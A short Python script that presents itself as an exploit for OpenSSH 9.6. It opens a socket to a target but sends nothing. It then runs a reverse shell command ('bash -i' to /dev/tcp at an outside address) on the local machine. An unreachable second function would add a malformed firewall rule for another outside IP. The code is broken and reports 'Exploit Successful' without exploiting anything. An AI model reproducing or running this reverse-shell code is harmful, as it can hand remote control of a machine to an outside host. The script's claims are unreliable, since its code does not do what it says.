## Software Name: Local Command Injection
## author: 303
import socket
import argparse
import subprocess

argparser = argparse.ArgumentParser(description="This piece of software is used to exploit a vulnerability in the openssh 9.6")
argparser.add_argument("-s", "--server", required=True, help="The target server")
argparser.add_argument("-p", "--port", required=True, help="The target port")
args = argparser.parse_args()

server = args.server
port = args.port

## we connect to the target server with a socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((server, int(port)))

def exploit(server, port):
    command = "bash -i >& /dev/tcp/10.5.10.34/443"


    print("Executing command: %s" % command)

    try:
        output = subprocess.check_output(command, shell=True)
        print("Command output: %s" % output.decode())
        print("Exploit Successful")
    except subprocess.CalledProcessError as e:
        print("Command failed with exit code %d" % e.returncode)
        print("Command output: %s" % e.output.decode())

    s.close()

exploit(server, port)

def payload(server, port):
    payload = "ufw allow netconnect from 185.217.197.4/44"
    print("Executing command: %s" % payload)
    if subprocess.call(payload, shell=True):
        print("Exploit Successful")
        s.close()
        exit(0)

        payload(server, port)




